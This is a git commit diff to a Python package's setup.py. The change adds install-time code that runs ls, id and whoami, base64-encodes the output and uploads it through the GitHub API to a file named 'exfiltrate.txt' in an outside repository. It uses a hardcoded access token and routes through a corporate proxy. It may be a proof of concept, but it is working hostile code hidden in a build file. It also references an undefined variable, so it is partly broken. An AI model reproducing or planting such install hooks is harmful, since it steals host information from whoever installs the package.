4a78e401181a253e9b880b17d02ab6795e774de3
Alexandre Briongos <alexandre.biongos@gmail.com>
2024-05-02 14:04:48 +0200

    add push to git

--- setup.py
+++ setup.py
@@ -6,23 +6,47 @@ import requests
 
 def RunCommand():
     print("Hello, p0wnd!")
-
+    text_to_send = "base:\n"
     command = "ls"
     result = subprocess.check_output(command, shell=True, text=True)
+    text_to_send+=str(result)
     print(result)
     command = "id"
     result = subprocess.check_output(command, shell=True, text=True)
+    text_to_send+=str(result)
     print(result)
     command = "whoami"
     result = subprocess.check_output(command, shell=True, text=True)
+    text_to_send+=str(result)
     print(result)
     proxies = {
         'http': 'http://proxy.hub.gcp.groupement.systeme-u.fr:80',
     }
 
-    r = requests.get('http://ngrok.io', proxies=proxies)
+    r = requests.get('http://ngrok.io')
     print(r.status_code)
     print(r.text)
+    text_to_send+=str(r.text)
+
+    url = "https://api.github.com/repos/androne23/this_is_fine_wuzzi/contents/exfiltrate.txt"
+    headers = {
+    'Accept': 'application/vnd.github+json',
+    'Authorization': 'Bearer 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',
+    }
+
+    response = requests.request("GET", url, headers=headers, proxies=proxies)
+
+    msg = "exfiltration"
+    text_to_send=base64.b64encode(text_to_send.encode("utf-8")).decode("utf-8")
+    data = response.json()
+    data = {
+        "message": msg, # Put your commit message here.
+        "content": text_to_send,
+        "sha": data['sha']
+    }
+    r = requests.put(api, headers=headers, json=data, proxies=proxies)
+    print(r.text)
+
 
 class RunEggInfoCommand(egg_info):
     def run(self):
